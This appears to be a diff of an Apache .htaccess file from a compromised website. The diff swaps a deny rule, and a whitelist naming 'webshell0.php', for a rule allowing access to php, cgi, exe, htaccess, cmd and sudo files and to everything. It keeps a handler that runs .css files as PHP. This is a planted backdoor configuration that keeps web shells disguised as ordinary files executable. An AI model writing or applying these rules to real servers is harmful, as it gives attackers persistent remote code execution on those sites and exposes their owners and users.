@@ -1,12 +1,8 @@
-<FilesMatch ".(py|exe|php)$">
-Order allow,deny
-Deny from all
-</FilesMatch>
-<FilesMatch "^(index.php|url.php|template.php|url.css|index.html|webshell0.php)$">
+
+<FilesMatch ".(shtml|inc|cgi|perl|htaccess|cmd|sudo|py|exe|php)$">
 Order allow,deny
 Allow from all
 </FilesMatch>
-
 <IfModule mod_rewrite.c>
 RewriteEngine On
 RewriteBase /
@@ -16,10 +12,9 @@ RewriteCond %{REQUEST_FILENAME} !-d
 RewriteRule . /index.php [L]
 </IfModule>
 
-
-
-
-</FilesMatch>
 <FilesMatch "\.css$">
     SetHandler application/x-httpd-alt-php74___lsphp
 </FilesMatch>
+
+Require all granted
+Allow from all
